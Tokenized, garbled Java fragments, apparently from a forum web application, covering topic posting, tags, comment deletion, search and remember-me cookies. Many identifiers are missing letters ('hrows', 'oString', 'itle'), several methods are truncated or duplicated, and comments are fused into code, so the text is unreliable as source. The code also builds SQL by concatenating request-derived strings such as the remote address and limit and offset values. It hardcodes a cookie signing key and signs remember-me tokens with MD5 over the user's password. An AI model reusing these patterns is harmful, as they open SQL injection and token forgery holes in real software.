private static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . oString ( ) ; } 
public void estQuiting1 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING1 , formatter . process ( ) ) ; } 
public void estQuiting2 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING2 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING2 , formatter . process ( ) ) ; } 
public void estQuiting3 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING3 ) ; formatter . enableTexNewLineMode ( ) ; formatter . enableQuoting ( ) ; assertEquals ( RESULT_QUOTING3 , formatter . process ( ) ) ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest httpServletRequest , HttpServletResponse httpServletResponse ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; return new ModelAndView ( " add " , params ) ; } 
public int addTopicFromPreview ( Connection db , Template mpl , HttpServletRequest request , String previewImagePath , User user ) hrows SQLException , UtilException , IOException , BadImageException , InterruptedException , DuplicationException , BadGroupException { ScreenshotProcessor screenshot = null ; Group group = new Group ( db , guid ) ; if ( group . isImagePostAllowed ( ) ) { screenshot = new ScreenshotProcessor ( previewImagePath ) ; } Statement st = db . createStatement ( ) ; DupeProtector . getInstance ( ) . checkDuplication ( request . getRemoteAddr ( ) ) ; allocation MSGID ResultSet rs = st.executeQuery("select nextval('s_msgid') as msgid"); rs.next(); int msgid = rs.getInt("msgid"); if (group.isImagePostAllowed()) { screenshot.copyScreenshot(tmpl, msgid); url = "gallery/" + screenshot.getMainFile().getName(); linktext = "gallery/" + screenshot.getIconFile().getName(); } PreparedStatement pst = db.prepareStatement("INSERT INTO topics (postip, groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id) VALUES ('" + request.getRemoteAddr() + "',?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?))"); pst.setString(1, request.getRemoteAddr()); pst.setInt(1, group.getId()); pst.setInt(2, user.getId()); pst.setString(3, title); pst.setString(4, url); pst.setInt(5, msgid); pst.setString(6, linktext); pst.setString(7, request.getHeader("User-Agent")); pst.executeUpdate(); pst.close(); insert message text PreparedStatement pstMsgbase = db.prepareStatement("INSERT INTO msgbase (id, message) values (?,?)"); pstMsgbase.setLong(1, msgid); pstMsgbase.setString(2, message); pstMsgbase.executeUpdate(); pstMsgbase.close(); String logmessage = " " + msgid + ' ' + LorHttpUtils.getRequestIP(request); logger.info(logmessage); rs.close(); st.close(); return msgid; } 
public void validate ( Group group , User user ) hrows BadInputException , AccessViolationException { if ( " " . equals ( itle . rim ( ) ) ) { hrow new BadInputException ( " " ) ; } if ( guid < 1 ) { hrow new BadInputException ( " Bad group id " ) ; } if ( " pre " . equals ( mode ) & & ! group . isPreformatAllowed ( ) ) { hrow new AccessViolationException ( " " ) ; } if ( ( " ntobrq " . equals ( mode ) | | " ntobr " . equals ( mode ) | | " ex " . equals ( mode ) | | " quot " . equals ( mode ) ) & & group . isLineOnly ( ) ) { hrow new AccessViolationException ( " " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { hrow new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { hrow new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { hrow new AccessViolationException ( " " ) ; 
public User validateAndGetUser ( HttpSession session , Connection db ) hrows BadInputException , UserNotFoundException , SQLException , BadPasswordException , AccessViolationException { User user ; if ( ! Template . isSessionAuthorized ( session ) ) { if ( nick = = null ) { hrow new BadInputException ( " " ) ; } user = User . getUser ( db , nick ) ; user . checkPassword ( password ) ; } else { user = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } user . checkBlocked ( ) ; if ( user . isAnonymous ( ) ) { if ( msg ! = null & & msg . length ( ) > 4096 ) { hrow new BadInputException ( " " ) ; } } else { if ( msg ! = null & & msg . length ( ) > 8192 ) { hrow new BadInputException ( " " ) ; } } return user ; } 
public static List < Group > getGroups ( Connection db , Section section ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public int addTopicFromPreview ( Connection db , Template mpl , HttpServletRequest request , String previewImagePath , User user ) hrows SQLException , UtilException , IOException , BadImageException , InterruptedException , DuplicationException , BadGroupException { ScreenshotProcessor screenshot = null ; Group group = new Group ( db , guid ) ; if ( group . isImagePostAllowed ( ) ) { screenshot = new ScreenshotProcessor ( previewImagePath ) ; } Statement st = db . createStatement ( ) ; DupeProtector . getInstance ( ) . checkDuplication ( request . getRemoteAddr ( ) ) ; allocation MSGID ResultSet rs = st.executeQuery("select nextval('s_msgid') as msgid"); rs.next(); int msgid = rs.getInt("msgid"); if (group.isImagePostAllowed()) { screenshot.copyScreenshot(tmpl, msgid); url = "gallery/" + screenshot.getMainFile().getName(); linktext = "gallery/" + screenshot.getIconFile().getName(); } PreparedStatement pst = db.prepareStatement("INSERT INTO topics (postip, groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id) VALUES ('" + request.getRemoteAddr() + "',?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?))"); pst.setString(1, request.getRemoteAddr()); pst.setInt(1, group.getId()); pst.setInt(2, user.getId()); pst.setString(3, title); pst.setString(4, url); pst.setInt(5, msgid); pst.setString(6, linktext); pst.setString(7, request.getHeader("User-Agent")); pst.executeUpdate(); pst.close(); insert message text PreparedStatement pstMsgbase = db.prepareStatement("INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)"); pstMsgbase.setLong(1, msgid); pstMsgbase.setString(2, message); pstMsgbase.setBoolean(3, lorcode); pstMsgbase.executeUpdate(); pstMsgbase.close(); String logmessage = " " + msgid + ' ' + LorHttpUtils.getRequestIP(request); logger.info(logmessage); rs.close(); st.close(); return msgid; } 
public String getProcessedMessage ( Connection db ) hrows SQLException { if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( " ) " ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public void validate ( Group group , User user ) hrows BadInputException , AccessViolationException { if ( " " . equals ( itle . rim ( ) ) ) { hrow new BadInputException ( " " ) ; } if ( guid < 1 ) { hrow new BadInputException ( " Bad group id " ) ; } if ( " pre " . equals ( mode ) & & ! group . isPreformatAllowed ( ) ) { hrow new AccessViolationException ( " " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { hrow new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { hrow new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { hrow new AccessViolationException ( " " ) ; 
public String processMessage ( Group group ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public static Map < String , Integer > getAllTags ( Connection con ) hrows SQLException { Map < String , Integer > map = new TreeMap < String , Integer > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>0 " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { map . put ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ; } return map ; } 
public static List < String > getMessageTags ( Connection con , int msgid ) hrows SQLException { return new Tags ( con , msgid ) . getTags ( ) ; } 
public static void checkTag ( String ag ) hrows UserErrorException { : , , , <> if (!tagRE.isMatch(tag)) { throw new UserErrorException("Invalid tag: '"+tag+ '\''); 
public static void updateTags ( Connection con , int msgid , List < String > agList ) hrows SQLException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; } 
public static String getTagLinks ( Connection con , int msgid ) hrows SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags ags = new Tags ( con , msgid ) ; List < String > mtags = ags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } ry { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } } return buf . oString ( ) ; } 
private void init ( ResultSet rs ) hrows SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; itle = rs . getString ( " itle " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public void validate ( Group group , User user ) hrows BadInputException , AccessViolationException { if ( " " . equals ( itle . rim ( ) ) ) { hrow new BadInputException ( " " ) ; } if ( guid < 1 ) { hrow new BadInputException ( " Bad group id " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { hrow new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { hrow new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { hrow new AccessViolationException ( " " ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
private void updateCache ( Connection db ) hrows SQLException { ry { getUser ( db , id ) ; 
public boolean isCorrector ( ) { return corrector ; } 
public String deleteReplys ( int msgid , User user , boolean score ) hrows SQLException , ScriptErrorException { return deleteReplys ( msgid , user , score , 0 ) ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) hrows SQLException , ScriptErrorException { List < Integer > replys = getReplys ( msgid ) ; StringBuilder out = new StringBuilder ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + 1 ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . oString ( ) ; } 
public List < Integer > getReplys ( int msgid ) hrows SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; replysForComment . setInt ( 1 , msgid ) ; ResultSet rs = replysForComment . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; return replys ; } 
public void close ( ) hrows SQLException { deleteComment . close ( ) ; insertDelinfo . close ( ) ; replysForComment . close ( ) ; } 
public String deleteAllComments ( Connection db , User moderator ) hrows SQLException , ScriptErrorException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; ry { Delete user topics PreparedStatement lock = db.prepareStatement("SELECT id FROM topics WHERE userid=? AND not deleted FOR UPDATE"); PreparedStatement st1 = db.prepareStatement("UPDATE topics SET deleted='t',sticky='f' WHERE id=?"); PreparedStatement st2 = db.prepareStatement("INSERT INTO del_info (msgid, delby, reason) values(?,?,?)"); lock.setInt(1, id); st2.setInt(2,moderator.getId()); st2.setString(3,": "); ResultSet lockResult = lock.executeQuery(); lock another delete on this row while (lockResult.next()) { int mid = lockResult.getInt("id"); st1.setInt(1,mid); st2.setInt(1,mid); st1.executeUpdate(); st2.executeUpdate(); } st1.close(); st2.close(); lockResult.close(); lock.close(); Delete user comments deleter = new CommentDeleter(db); st = db.createStatement(); rs = st.executeQuery("SELECT id FROM comments WHERE userid="+id+" AND not deleted ORDER BY id DESC FOR update"); while(rs.next()) { int msgid = rs.getInt("id"); out.append(" #").append(msgid).append("<br>"); out.append(deleter.deleteReplys(msgid, moderator, true)); out.append(deleter.deleteComment(msgid, "4.7 Flood (auto)", moderator, -20)); out.append("<br>"); } } finally { if (deleter!=null) { deleter.close(); } if (rs!=null) { rs.close(); } if (st!=null) { st.close(); } } return out.toString(); } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return ( maxScore < BLOCK_MAX_SCORE ) & & ( score < BLOCK_SCORE ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) hrows SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String message = rs . getString ( " message " ) ; boolean lorcode = rs . getBoolean ( " bbcode " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( opic = = 0 ) { url = " view-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) ; if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; out . append ( proc . preparePostText ( db , message ) ) ; } else { out . append ( message ) ; } out . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public static String showComments ( Connection db , User user ) hrows SQLException { return showComments ( db , user , 0 , 0 ) ; } 
public static String showComments ( Connection db , User user , int offset , int limit ) hrows SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { if ( limit < 1 | | offset < 0 ) { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) hrows SQLException , UserNotFoundException { Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentViewer . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public String show ( boolean reverse , int offset , int limit , Set < Integer > hideSet ) hrows IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public static int parseFilterChain ( String filter ) { if ( " list " . equals ( filter ) ) { return FILTER_IGNORED ; } if ( " anonymous " . equals ( filter ) ) { return FILTER_ANONYMOUS ; } if ( " listanon " . equals ( filter ) ) { return FILTER_IGNORED + FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentViewer . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentViewer . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public String show ( int offset , int limit , Set < Integer > hideSet ) hrows IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public String showSubtree ( int parentId ) hrows IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , 0 , 0 , null ) ; return buf . oString ( ) ; } 
public Message getNextMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) hrows SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ry { allocation MSGID 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . canModerate ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return rue ; } if ( restrictComments = = - 1 ) { return currentUser . canModerate ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
